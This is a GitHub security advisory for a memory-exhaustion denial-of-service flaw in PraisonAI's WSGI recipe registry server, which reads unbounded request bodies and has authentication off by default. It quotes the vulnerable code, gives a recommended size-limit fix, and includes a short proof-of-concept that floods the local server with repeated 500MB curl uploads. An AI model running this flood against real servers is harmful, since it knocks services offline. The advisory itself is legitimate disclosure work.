# [M] PraisonAI has Unrestricted Upload Size in WSGI Recipe Registry Server that Enables Memory Exhaustion DoS

## Summary
Severity: Medium
Advisory: GHSA-2xgv-5cv2-47vv
CVE: CVE-2026-40115
CWE: CWE-770
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-2xgv-5cv2-47vv
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.5.128

## Details
## Summary

The WSGI-based recipe registry server (`server.py`) reads the entire HTTP request body into memory based on the client-supplied `Content-Length` header with no upper bound. Combined with authentication being disabled by default (no token configured), any local process can send arbitrarily large POST requests to exhaust server memory and cause a denial of service. The Starlette-based server (`serve.py`) has `RequestSizeLimitMiddleware` with a 10MB limit, but the WSGI server lacks any equivalent protection.

## Details

The vulnerable code path in `src/praisonai/praisonai/recipe/server.py`:

**1. No size limit on body read (line 551-555):**
```python
content_length = int(environ.get("CONTENT_LENGTH", 0))
body = environ["wsgi.input"].read(content_length) if content_length > 0 else b""
```

The `content_length` is taken directly from the HTTP header with no maximum check. The entire body is read into a single `bytes` object in memory.

**2. Second in-memory copy via multipart parsing (line 169-172):**
```python
result = {"fields": {}, "files": {}}
boundary_bytes = f"--{boundary}".encode()
parts = body.split(boundary_bytes)
```

The `_parse_multipart` method splits the already-buffered body and stores file contents in a dict, creating additional in-memory copies.

**3. Third copy to temp file (line 420-421):**
```python
with tempfile.NamedTemporaryFile(suffix=".praison", delete=False) as tmp:
    tmp.write(bundle_content)
```

The bundle content is then written to disk and persisted in the registry, also without size checks.

**4. Authentication disabled by default (line 91-94):**
```python
def _check_auth(self, headers: Dict[str, str]) -> bool:
    if not self.token:
        return True  # No token configured = no auth
```

The `self.token` defaults to `None` unless `PRAISONAI_REGISTRY_TOKEN` is set or `--token` is passed on the CLI.

The entry point is `praisonai registry serve` (cli/features/registry.py:176), which calls `run_server()` binding to `127.0.0.1:7777` by default.

In contrast, `serve.py` (the Starlette server) has `RequestSizeLimitMiddleware` at line 725-732 enforcing a 10MB default limit. The WSGI server has no equivalent.

## PoC

```bash
# Start the registry server with default settings (no auth, localhost)
praisonai registry serve &

# Step 1: Create a large bundle (~500MB)
mkdir -p /tmp/dos-test
echo '{"name":"dos","version":"1.0.0"}' > /tmp/dos-test/manifest.json
dd if=/dev/zero of=/tmp/dos-test/pad bs=1M count=500
tar czf /tmp/dos-bundle.praison -C /tmp/dos-test .

# Step 2: Upload — server buffers ~500MB into RAM with no limit
curl -X POST http://127.0.0.1:7777/v1/recipes/dos/1.0.0 \
  -F 'bundle=@/tmp/dos-bundle.praison' -F 'force=true'

# Step 3: Repeat to exhaust memory
for v in 1.0.{1..10}; do
  curl -X POST http://127.0.0.1:7777/v1/recipes/dos/$v \
    -F 'bundle=@/tmp/dos-bundle.praison' &
done
# Server process will be OOM-killed
```

## Impact

- **Memory exhaustion**: A single large request can consume all available memory, crashing the server process (and potentially other processes via OOM killer).
- **Disk exhaustion**: Repeated uploads persist bundles to disk at `~/.praison/registry/` with no quota, potentially filling the filesystem.
- **No authentication barrier**: Default configuration requires no token, so any local process (including via SSRF from other services on the same host) can trigger this.
- **Availability impact**: The registry server becomes unavailable, blocking recipe publish/download operations.

The default bind address of `127.0.0.1` limits exploitability to local attackers or SSRF scenarios. If a user binds to `0.0.0.0` (common for shared environments or containers), the attack surface extends to the network.

## Recommended Fix

Add a request size limit to the WSGI application, consistent with `serve.py`'s 10MB default:

```python
# In create_wsgi_app(), before reading the body:
MAX_REQUEST_SIZE = 10 * 1024 * 1024  # 10MB, matching serve.py

def application(environ, start_response):
    # ... existing code ...
    
    # Read body with size limit
    try:
        content_length = int(environ.get("CONTENT_LENGTH", 0))
    except (ValueError, TypeError):
        content_length = 0
    
    if content_length > MAX_REQUEST_SIZE:
        status = "413 Request Entity Too Large"
        response_headers = [("Content-Type", "application/json")]
        body = json.dumps({
            "error": {
                "code": "request_too_large",
                "message": f"Request body too large. Max: {MAX_REQUEST_SIZE} bytes"
            }
        }).encode()
        start_response(status, response_headers)
        return [body]
    
    body = environ["wsgi.input"].read(content_length) if content_length > 0 else b""
    # ... rest of handler ...
```

Additionally, consider:
- Adding a `--max-request-size` CLI flag to `praisonai registry serve`
- Adding per-recipe disk quota enforcement in `LocalRegistry.publish()`

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-2xgv-5cv2-47vv
- https://nvd.nist.gov/vuln/detail/CVE-2026-40115
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.128
